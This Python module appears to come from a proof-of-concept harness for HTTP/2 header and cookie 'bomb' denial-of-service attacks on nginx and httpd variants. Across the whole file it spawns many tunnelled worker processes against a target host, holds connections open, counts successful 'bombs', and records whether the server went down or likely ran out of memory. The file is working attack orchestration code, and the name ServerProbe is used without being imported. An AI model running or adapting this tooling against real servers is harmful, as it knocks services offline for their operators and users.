"""Multiprocess worker campaign strategies."""
from __future__ import annotations

import subprocess
import sys
import threading
import time
import uuid

from pathlib import Path

from attack_config import AttackConfig, CookieAttackConfig, profile_apex_cookie_httpd, profile_efficiency
from models import RunResult
from paths import BENCH_DIR, DEFAULT_PORT, LOG_DIR
from persistence import persist_run, utc_now
from probe import monitor_during, probe_server
from tunnel_runner import popen as tunnel_popen
from h2_enhanced import configure_h2_variant
from variants import get_variant, set_poc_path

def _count_mp_workers(log_dir: Path, count: int) -> tuple[int, float]:
    import re

    bomb_ok = 0
    wire_bytes = 0.0
    for i in range(count):
        lp = log_dir / f"worker_{i}.log"
        if not lp.exists():
            continue
        txt = lp.read_text(errors="replace")
        if "WORKER_BOMB_OK" in txt or "WORKER_OK" in txt:
            bomb_ok += 1
        m = re.search(r"WORKER_BOMB_OK conn=\d+ wire=([\d.eE+-]+)", txt)
        if not m:
            m = re.search(r"WORKER_OK conn=\d+ wire=([\d.eE+-]+)", txt)
        if m:
            try:
                wire_bytes += float(m.group(1))
            except ValueError:
                pass
    return bomb_ok, wire_bytes / 1024 / 1024


def run_multiprocess(
    host: str,
    count: int,
    hold: int = 240,
    stagger: float = 0.5,
    cfg: AttackConfig | None = None,
    port: int = DEFAULT_PORT,
    strategy: str | None = None,
    variant: str = "nginx",
    cookie_cfg: CookieAttackConfig | None = None,
) -> RunResult:
    """One OS process per connection — avoids GIL/thread write contention."""
    spec = get_variant(variant)
    if spec.kind == "cookie":
        return run_cookie_multiprocess(
            host, count, port, cookie_cfg or profile_apex_cookie_httpd(), variant, strategy
        )

    set_poc_path(variant)
    configure_h2_variant(variant)
    cfg = cfg or profile_efficiency()
    py = sys.executable
    worker = BENCH_DIR / "single_conn_worker.py"
    probe_before = probe_server(host, port)
    during: list[ServerProbe] = []
    stop = threading.Event()
    mon = threading.Thread(
        target=monitor_during, args=(host, stop, during, 6.0), kwargs={"port": port}, daemon=True
    )
    mon.start()

    t0 = time.monotonic()
    procs: list[subprocess.Popen] = []
    log_dir = LOG_DIR / f"mp_{int(t0)}"
    log_dir.mkdir(parents=True, exist_ok=True)

    for i in range(count):
        lp = log_dir / f"worker_{i}.log"
        p = tunnel_popen(
            [py, str(worker), "--host", host, "--port", str(port), "--conn-id", str(i),
             "--streams", str(cfg.streams), "--headers", str(cfg.headers),
             "--hold", str(hold if hold != 240 else cfg.hold),
             "--drip", str(cfg.drip),
             "--hold-mode", cfg.hold_mode,
             "--waves", str(cfg.waves_per_conn),
             "--wave-gap", str(cfg.wave_gap_sec)],
            stdout=lp.open("w"),
            stderr=subprocess.STDOUT,
        )
        procs.append(p)
        time.sleep(stagger)

    spawn_sec = count * stagger + 10
    bomb_deadline = time.monotonic() + spawn_sec + 180
    last_ok = -1
    ok_workers = 0
    wire_mb = 0.0

    while time.monotonic() < bomb_deadline:
        ok_workers, wire_mb = _count_mp_workers(log_dir, count)
        if ok_workers >= count:
            break
        if ok_workers == last_ok and time.monotonic() > t0 + spawn_sec + 90:
            break
        last_ok = ok_workers
        time.sleep(4)

    monitor_until = time.monotonic() + min(hold, 120)
    while time.monotonic() < monitor_until:
        during.append(probe_server(host, port))
        time.sleep(8)

    ok_workers, wire_mb = _count_mp_workers(log_dir, count)
    probe_after = probe_server(host, port, timeout=20)
    stop.set()
    mon.join(timeout=3)

    strat = strategy or f"multiprocess_{count}"
    result = RunResult(
        run_id=str(uuid.uuid4())[:8],
        timestamp=utc_now(),
        strategy=strat,
        target=f"{host}:{port}",
        connections_requested=count,
        connections_established=len(procs),
        connections_bomb_ok=ok_workers,
        connections_active_end=sum(1 for p in procs if p.poll() is None),
        wire_mb=round(wire_mb, 2),
        hold_sec=hold if hold != 240 else cfg.hold,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=during[-1] if during else None,
        probe_after=probe_after,
        probe_worst_latency=max((s.latency_sec for s in during if s.latency_sec), default=None),
        server_down=any(not s.ok for s in during),
        oom_likely=not probe_after.ok or (probe_after.http_code or 0) >= 500,
        duration_sec=time.monotonic() - t0,
        notes=f"workers={count} bomb_ok={ok_workers} wire_mb={wire_mb:.1f} logs={log_dir}",
        extra={
            "variant": variant,
            "kind": spec.kind,
            "worker_log_dir": str(log_dir),
            "attack_config": cfg.to_extra(),
        },
    )
    persist_run(result)
    print(f"Multiprocess: {ok_workers}/{count} workers bomb OK, wire={wire_mb:.1f} MB", flush=True)
    return result


def run_cookie_multiprocess(
    host: str,
    count: int,
    port: int,
    cfg: CookieAttackConfig,
    variant: str,
    strategy: str | None = None,
    stagger: float = 0.25,
) -> RunResult:
    py = sys.executable
    worker = BENCH_DIR / "single_cookie_worker.py"
    probe_before = probe_server(host, port)
    during: list[ServerProbe] = []
    stop = threading.Event()
    mon = threading.Thread(
        target=monitor_during, args=(host, stop, during, 6.0), kwargs={"port": port}, daemon=True
    )
    mon.start()

    t0 = time.monotonic()
    procs: list[subprocess.Popen] = []
    log_dir = LOG_DIR / f"cookie_mp_{int(t0)}"
    log_dir.mkdir(parents=True, exist_ok=True)

    for i in range(count):
        lp = log_dir / f"worker_{i}.log"
        argv = [
            py, str(worker), "--host", host, "--port", str(port),
            "--variant", cfg.variant,
            "--conn-id", str(i),
            "--streams", str(cfg.streams),
            "--refs", str(cfg.refs),
            "--hold", str(cfg.hold),
            "--drip", str(cfg.drip),
            "--hold-mode", cfg.hold_mode,
            "--path", cfg.path,
            "--cookie-value-size", str(cfg.cookie_value_size),
            "--server-name", host,
        ]
        p = tunnel_popen(argv, stdout=lp.open("w"), stderr=subprocess.STDOUT)
        procs.append(p)
        time.sleep(stagger)

    spawn_sec = count * stagger + 10
    bomb_deadline = time.monotonic() + spawn_sec + 180
    ok_workers, wire_mb = 0, 0.0
    while time.monotonic() < bomb_deadline:
        ok_workers, wire_mb = _count_mp_workers(log_dir, count)
        if ok_workers >= count:
            break
        time.sleep(4)

    monitor_until = time.monotonic() + min(cfg.hold, 120)
    while time.monotonic() < monitor_until:
        during.append(probe_server(host, port))
        time.sleep(8)

    ok_workers, wire_mb = _count_mp_workers(log_dir, count)
    probe_after = probe_server(host, port, timeout=20)
    stop.set()
    mon.join(timeout=3)

    strat = strategy or f"apex_cookie_mp_{count}"
    result = RunResult(
        run_id=str(uuid.uuid4())[:8],
        timestamp=utc_now(),
        strategy=strat,
        target=f"{host}:{port}",
        connections_requested=count,
        connections_established=len(procs),
        connections_bomb_ok=ok_workers,
        connections_active_end=sum(1 for p in procs if p.poll() is None),
        wire_mb=round(wire_mb, 2),
        hold_sec=cfg.hold,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=during[-1] if during else None,
        probe_after=probe_after,
        probe_worst_latency=max((s.latency_sec for s in during if s.latency_sec), default=None),
        server_down=any(not s.ok for s in during),
        oom_likely=not probe_after.ok or (probe_after.http_code or 0) >= 500,
        duration_sec=time.monotonic() - t0,
        notes=f"cookie workers={count} bomb_ok={ok_workers}",
        extra={
            "variant": variant,
            "kind": "cookie",
            "worker_log_dir": str(log_dir),
            "attack_config": cfg.to_extra(),
        },
    )
    persist_run(result)
    return result